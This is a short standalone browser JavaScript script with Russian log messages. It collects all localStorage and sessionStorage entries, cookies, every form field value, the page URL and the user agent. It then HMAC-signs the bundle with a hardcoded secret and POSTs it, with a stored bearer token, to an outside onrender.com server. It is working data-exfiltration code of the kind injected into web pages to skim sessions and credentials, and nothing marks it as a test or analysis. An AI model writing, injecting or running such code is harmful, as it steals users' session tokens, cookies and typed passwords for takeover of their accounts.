(async function () {
  const encoder = new TextEncoder();

  const collectData = () => {
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }

    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionStorageData[key] = sessionStorage.getItem(key);
    }

    const cookies = document.cookie;

    const formData = {};
    document.querySelectorAll('input, textarea, select').forEach(el => {
      const name = el.name || el.id || el.type || `field_${Math.random()}`;
      formData[name] = el.value;
    });

    return {
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      cookies: cookies,
      formData: formData,
      url: location.href,
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString()
    };
  };

  const createHMAC = async (payloadStr, secret) => {
    const key = await crypto.subtle.importKey(
      "raw",
      encoder.encode(secret),
      { name: "HMAC", hash: "SHA-256" },
      false,
      ["sign"]
    );
    const signature = await crypto.subtle.sign(
      "HMAC",
      key,
      encoder.encode(payloadStr)
    );
    return Array.from(new Uint8Array(signature))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  };

  const token = localStorage.getItem('token') || '';
  const secret = 's1-secret-key';

  const payload = collectData();
  const payloadStr = JSON.stringify(payload);
  const signature = await createHMAC(payloadStr, secret);

  const finalPayload = {
    payload,
    signature
  };

  fetch("https://server5-asj2.onrender.com/", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": "Bearer " + token
    },
    body: JSON.stringify(finalPayload)
  }).then(res => {
    console.log("[S-1] Данные отправлены. Статус:", res.status);
  }).catch(err => {
    console.warn("[S-1] Ошибка отправки:", err);
  });
})();
